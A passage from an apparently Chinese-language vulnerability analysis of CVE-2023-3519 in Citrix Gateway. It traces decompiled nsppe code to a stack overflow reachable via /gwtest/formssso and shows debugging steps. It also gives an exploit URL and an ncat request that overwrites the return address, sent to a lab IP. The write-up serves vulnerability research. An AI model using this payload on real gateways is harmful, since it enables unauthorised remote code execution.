v25);</span></span></code></pre></div><p><code>ns_aaa_gwtest_get_event_and_target_names</code>由<code>ns_aaa_gwtest_get_valid_fsso_server</code>调用，其中v15为栈内char数组，大小为128字节。分析到这可以猜测，由于请求url的参数可控，自然请求url长度也可控，而v15这个数组为栈内数组，大小为128字节。<code>ns_aaa_saml_url_decode_inner</code>函数中循环次数由url长度决定，也就是可以控制写入v15数组的字节数，如果url过长则在循环时写入的字节数超过128字节，造成栈溢出。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">ns_aaa_gwtest_get_valid_fsso_server</span>(<span style="color:#66d9ef">__int64</span> a1)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> v1;<span style="color:#75715e">// rbx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v2;<span style="color:#75715e">// eax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v4;<span style="color:#75715e">// r8d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v5;<span style="color:#75715e">// r9d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span> v6;<span style="color:#75715e">// ax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v7;<span style="color:#75715e">// r8d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v8;<span style="color:#75715e">// r9d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v9;<span style="color:#75715e">// rcx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v10;<span style="color:#75715e">// eax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v11;<span style="color:#75715e">// ecx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">bool</span> v12;<span style="color:#75715e">// cf</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v13;<span style="color:#75715e">// eax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v14;<span style="color:#75715e">// rcx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> __int128 v15[<span style="color:#ae81ff">8</span>];<span style="color:#75715e">// [rsp+10h] [rbp-A0h] BYREF</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v16;<span style="color:#75715e">// [rsp+94h] [rbp-1Ch] BYREF</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v17;<span style="color:#75715e">// [rsp+98h] [rbp-18h] BYREF</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v18[<span style="color:#ae81ff">3</span>];<span style="color:#75715e">// [rsp+A4h] [rbp-Ch] BYREF</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>(v15,<span style="color:#ae81ff">0</span>,<span style="color:#66d9ef">sizeof</span>(v15));</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v18[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">ns_aaa_gwtest_get_event_and_target_names</span>(a1, (<span style="color:#66d9ef">__int64</span>)v15,<span style="color:#f92672">&amp;</span>v16) )</span></span></code></pre></div><p>向上追溯调用到该函数需要的路径，<code>ns_aaa_gwtest_get_valid_fsso_server</code>由<code>ns_aaa_gwtest_handler</code>调用，在代码中可以看到当请求url+8处为formssso时才会进入到调用<code>ns_aaa_gwtest_get_valid_fsso_server</code>函数的逻辑。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">ns_aaa_gwtest_handler</span>(<span style="color:#66d9ef">__int64</span> a1,<span style="color:#66d9ef">__int64</span> a2,<span style="color:#66d9ef">__int64</span> a3,<span style="color:#66d9ef">__int64</span> a4)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> v5;<span style="color:#75715e">// r15</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v6;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v7;<span style="color:#75715e">// rcx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> _QWORD<span style="color:#f92672">*</span>v8;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v9;<span style="color:#75715e">// r13d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> valid_fsso_server;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v11;<span style="color:#75715e">// rbx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v12;<span style="color:#75715e">// r14d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v13;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> is_valid_auth_action;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v15;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v16;<span style="color:#75715e">// rcx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v17;<span style="color:#75715e">// eax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v18;<span style="color:#75715e">// rcx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v20;<span style="color:#75715e">// rcx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v21;<span style="color:#75715e">// rdx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v22;<span style="color:#75715e">// [rsp+0h] [rbp-30h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span> a3;</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span> ns_async_ctx;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( ns_async_ctx )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v20<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)ns_async_callers_context_size;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(ns_async_ctx<span style="color:#f92672">+</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)ns_async_callers_context_size<span style="color:#f92672">+</span><span style="color:#ae81ff">108</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">1486</span> )</span></span><span style="display:flex;"><span><span style="color:#a6e22e">panic_0</span>(<span style="color:#e6db74">"Incorrect context id in ASYNC_SAVE_CTX"</span>, a2, a3, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)ns_async_callers_context_size, a4);</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(ns_async_ctx<span style="color:#f92672">+</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)ns_async_callers_context_size<span style="color:#f92672">+</span><span style="color:#ae81ff">112</span>);</span></span><span style="display:flex;"><span> v11<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(ns_async_ctx<span style="color:#f92672">+</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)ns_async_callers_context_size<span style="color:#f92672">+</span><span style="color:#ae81ff">116</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(ns_async_ctx<span style="color:#f92672">+</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)ns_async_callers_context_size<span style="color:#f92672">+</span><span style="color:#ae81ff">112</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v6<span style="color:#f92672">+</span> v20<span style="color:#f92672">+</span><span style="color:#ae81ff">116</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0LL</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_41;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(a2<span style="color:#f92672">+</span><span style="color:#ae81ff">36</span>);</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span> (_QWORD<span style="color:#f92672">*</span>)(v7<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>);</span></span><span style="display:flex;"><span> a3<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v7<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">|</span><span style="color:#ae81ff">0x20202020u</span>;</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)a3<span style="color:#f92672">&lt;=</span><span style="color:#960050;background-color:#1e0010">'</span>lmar<span style="color:#960050;background-color:#1e0010">'</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (_DWORD)a3<span style="color:#f92672">==</span><span style="color:#960050;background-color:#1e0010">'</span><span style="color:#f92672">?</span>dck<span style="color:#960050;background-color:#1e0010">'</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#ae81ff">7</span>;</span></span><span style="display:flex;"><span> v11<span style="color:#f92672">=</span><span style="color:#ae81ff">0LL</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_41;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (_DWORD)a3<span style="color:#f92672">==</span><span style="color:#ae81ff">1752462689</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#f92672">*</span>v8<span style="color:#f92672">|</span><span style="color:#ae81ff">0x2020202020202020LL</span>)<span style="color:#f92672">!=</span><span style="color:#960050;background-color:#1e0010">'</span>vreshtua<span style="color:#960050;background-color:#1e0010">'</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)(v7<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">|</span><span style="color:#ae81ff">0x2020</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">29285</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (<span style="color:#f92672">*</span>(_BYTE<span style="color:#f92672">*</span>)(v7<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>)<span style="color:#f92672">|</span><span style="color:#ae81ff">0x20</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">63</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> v9;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v22<span style="color:#f92672">=</span> a4;</span></span><span style="display:flex;"><span> is_valid_auth_action<span style="color:#f92672">=</span><span style="color:#a6e22e">ns_aaa_gwtest_is_valid_auth_action</span>(a2);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( is_valid_auth_action )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v11<span style="color:#f92672">=</span> is_valid_auth_action;</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_39;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3907</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (_DWORD)a3<span style="color:#f92672">!=</span><span style="color:#960050;background-color:#1e0010">'</span>lluf<span style="color:#960050;background-color:#1e0010">'</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> v9;</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#ae81ff">9</span><span style="color:#f92672">*</span> ((<span style="color:#f92672">*</span>(_BYTE<span style="color:#f92672">*</span>)(v7<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span>)<span style="color:#f92672">|</span><span style="color:#ae81ff">0x20</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">63</span>);</span></span><span style="display:flex;"><span>LABEL_20:</span></span><span style="display:flex;"><span> v11<span style="color:#f92672">=</span><span style="color:#ae81ff">0LL</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>v12 )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> v9;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_41;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)a3<span style="color:#f92672">&lt;=</span><span style="color:#960050;background-color:#1e0010">'</span>nahb<span style="color:#960050;background-color:#1e0010">'</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (_DWORD)a3<span style="color:#f92672">==</span><span style="color:#960050;background-color:#1e0010">'</span>lmas<span style="color:#960050;background-color:#1e0010">'</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#f92672">*</span>(_WORD<span style="color:#f92672">*</span>)(v7<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span>)<span style="color:#f92672">|</span><span style="color:#ae81ff">0x2020</span>)<span style="color:#f92672">==</span> (<span style="color:#f92672">*</span>(_WORD<span style="color:#f92672">*</span>)<span style="color:#e6db74">"SP?"</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0x2020</span>)</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> (<span style="color:#f92672">*</span>(_BYTE<span style="color:#f92672">*</span>)(v7<span style="color:#f92672">+</span><span style="color:#ae81ff">14</span>)<span style="color:#f92672">|</span><span style="color:#ae81ff">0x20</span>)<span style="color:#f92672">==</span> (aSamlsp_0[<span style="color:#ae81ff">6</span>]<span style="color:#f92672">|</span><span style="color:#ae81ff">0x20</span>) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v22<span style="color:#f92672">=</span> a4;</span></span><span style="display:flex;"><span> v13<span style="color:#f92672">=</span><span style="color:#a6e22e">ns_aaa_gwtest_is_valid_auth_action</span>(a2);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v13 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v11<span style="color:#f92672">=</span> v13;</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_39;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#f92672">*</span>(_WORD<span style="color:#f92672">*</span>)(v7<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span>)<span style="color:#f92672">|</span><span style="color:#ae81ff">0x2020</span>)<span style="color:#f92672">!=</span> (<span style="color:#f92672">*</span>(_WORD<span style="color:#f92672">*</span>)<span style="color:#e6db74">"IdP?"</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0x2020</span>)</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (<span style="color:#f92672">*</span>(_BYTE<span style="color:#f92672">*</span>)(v7<span style="color:#f92672">+</span><span style="color:#ae81ff">14</span>)<span style="color:#f92672">|</span><span style="color:#ae81ff">0x20</span>)<span style="color:#f92672">!=</span> (aSamlidp_1[<span style="color:#ae81ff">6</span>]<span style="color:#f92672">|</span><span style="color:#ae81ff">0x20</span>) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> v9;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v22<span style="color:#f92672">=</span> a4;</span></span><span style="display:flex;"><span> v15<span style="color:#f92672">=</span><span style="color:#a6e22e">ns_aaa_gwtest_is_valid_auth_action</span>(a2);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v15 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v11<span style="color:#f92672">=</span> v15;</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_39;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (_DWORD)a3<span style="color:#f92672">!=</span><span style="color:#960050;background-color:#1e0010">'</span>mrof<span style="color:#960050;background-color:#1e0010">'</span><span style="color:#f92672">||</span> (<span style="color:#f92672">*</span>v8<span style="color:#f92672">|</span><span style="color:#ae81ff">0x2020202020202020LL</span>)<span style="color:#f92672">!=</span><span style="color:#960050;background-color:#1e0010">'</span>osssmrof<span style="color:#960050;background-color:#1e0010">'</span><span style="color:#f92672">||</span> (<span style="color:#f92672">*</span>(_BYTE<span style="color:#f92672">*</span>)(v7<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">|</span><span style="color:#ae81ff">0x20</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">63</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> v9;</span></span><span style="display:flex;"><span> v22<span style="color:#f92672">=</span> a4;</span></span><span style="display:flex;"><span> valid_fsso_server<span style="color:#f92672">=</span><span style="color:#a6e22e">ns_aaa_gwtest_get_valid_fsso_server</span>(a2);</span></span></code></pre></div><p><code>ns_aaa_gwtest_handler</code>由<code>ns_vpn_process_unauthenticated_request</code>函数调用，在<code>ns_vpn_process_unauthenticated_request</code>函数中有如下逻辑，当请求路径为<code>/gwtest/</code>时进入调用到目标函数的逻辑。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v51<span style="color:#f92672">==</span><span style="color:#ae81ff">1702131559</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)v26<span style="color:#f92672">|</span><span style="color:#960050;background-color:#1e0010">'</span><span style="color:#960050;background-color:#1e0010">'</span>)<span style="color:#f92672">!=</span><span style="color:#960050;background-color:#1e0010">'</span><span style="color:#f92672">/</span>tsetwg<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">'</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_2888;</span></span><span style="display:flex;"><span>LABEL_437:</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( ns_async_ctx<span style="color:#f92672">&amp;&amp;</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(ns_async_ctx<span style="color:#f92672">+</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)ns_async_callers_context_size<span style="color:#f92672">+</span><span style="color:#ae81ff">108</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">652</span> )</span></span><span style="display:flex;"><span><span style="color:#a6e22e">panic_0</span>(</span></span><span style="display:flex;"><span><span style="color:#e6db74">"Async context ID does not match expected context ID NS_ASYNC_CTX_AAA_UNAUTH_GWTEST"</span>,</span></span><span style="display:flex;"><span> a2,</span></span><span style="display:flex;"><span> v25,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)ns_async_callers_context_size,</span></span><span style="display:flex;"><span> v26);</span></span><span style="display:flex;"><span> v25<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(ns_async_callers_context_size<span style="color:#f92672">+</span><span style="color:#ae81ff">192</span>);</span></span><span style="display:flex;"><span> ns_async_callers_context_size<span style="color:#f92672">+=</span><span style="color:#ae81ff">192</span>;</span></span><span style="display:flex;"><span> v30<span style="color:#f92672">=</span> v1891;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( ns_async_ctx )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(ns_async_ctx<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">!=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">87101427</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_4683;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v25<span style="color:#f92672">&lt;</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(ns_async_ctx<span style="color:#f92672">+</span><span style="color:#ae81ff">104</span>) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> a2<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v25;</span></span><span style="display:flex;"><span> v25<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(ns_async_ctx<span style="color:#f92672">+</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v25<span style="color:#f92672">+</span><span style="color:#ae81ff">108</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">172</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v25<span style="color:#f92672">>=</span><span style="color:#ae81ff">0x611</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_759;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v164<span style="color:#f92672">=</span><span style="color:#a6e22e">ns_aaa_gwtest_handler</span>((<span style="color:#66d9ef">__int64</span>)v1896, v1897,<span style="color:#ae81ff">0LL</span>, v1891);</span></span></code></pre></div><p>综上可以总结到调用到漏洞函数<code>ns_aaa_saml_url_decode_inner</code>所需要的url为：</p><pre tabindex="0"><code>http://target/gwtest/formssso?event=start&amp;target=[overflow char]</code></pre><p>只需要让<code>[overflow char]</code>过长即可溢出在<code>ns_aaa_gwtest_get_valid_fsso_server</code>函数内的char数组，造成溢出。查看nsppe防护，可以发现PIE,CANARY都没开，只需要利用栈溢出写入shellcode然后<code>jmp esp</code>即可执行shellcode。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># checksec --file=nsppe_unpatched</span></span></span><span style="display:flex;"><span>RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE</span></span><span style="display:flex;"><span>No RELRO Canary found NX disabled No PIE No RPATH No RUNPATH<span style="color:#ae81ff">68527</span> Symbols No<span style="color:#ae81ff">0</span><span style="color:#ae81ff">0</span> nsppe_unpatched</span></span></code></pre></div><p><strong>动态调试</strong></p><p>找到nsppe进程</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@citrix3# ps aux | grep nsppe</span></span><span style="display:flex;"><span>root<span style="color:#ae81ff">457</span> 100.0 43.2<span style="color:#ae81ff">693320</span><span style="color:#ae81ff">693560</span> - Rs 19:10 223:34.32 nsppe<span style="color:#f92672">(</span>NSPPE-00<span style="color:#f92672">)</span></span></span></code></pre></div><p>禁用看门狗，使用命令禁止发送该信号</p><pre tabindex="0"><code>root@citrix3# nspf help
Usage: '/netscaler/nspf ((&lt;process_name> | &lt;pid>) &lt;action> | query)'
where &lt;process_name> is one of:
NSPPE-00 aslearn awsconfig bgpd de
imi isisd metricscollectomonuploadd nsaaad
nsaggregatord nscfsyncd nsclfsyncd nsclusterd nsconfigd
nscopo nsfsyncd nsgslbautosyncnslcd nslped
nsm nsnetsvc nsrised nstraceaggregatnsumond
ospf6d ospfd ptpd ripd ripngd
snmpd syshealthd
root@citrix3# /netscaler/nspf nsppe-00 pbmonitor 0
nspf NSPPE-00 pbmonitor 0
Removing pitboss monitor on process NSPPE-00 pid 37387</code></pre><p>使用Citrix ADC自带的gdb附加调试nsppe</p><pre tabindex="0"><code>gdb /netscaler/nsppe 461</code></pre><p>使用pattern_creat.rb创建字符串</p><pre tabindex="0"><code>┌──(root㉿kali)-[~]
└─# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</code></pre><p>发送payload，触发漏洞，此时rsp为6641376641366641，对应offset为168，也就是168开始覆盖rsp<img alt="" src="/images/vulnerability/CVE-2023-3519-Cirtix-Gateway-RCE.zh-cn.assets/5.png"/></p><p>发送payload，触发漏洞，此时rip指向0xcc指令地址，gdb断下</p><pre tabindex="0"><code>echo -ne 'GET /gwtest/formssso?event=start&amp;target=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x62\x8c\x6d\x00\x00\x00\x00\x00\xcc HTTP/1.1\r\nHost: 192.168.52.108\r\n\r\n' | ncat --ssl 192.168.52.108 443</code></pre><p>在gdb中可以看到缓冲区位于rbp-0xa0处。<img alt="" src="/images/vulnerability/CVE-2023-3519-Cirtix-Gateway-RCE.zh-cn.assets/4.png"/></p><p>通过谷歌，知道在Citrix 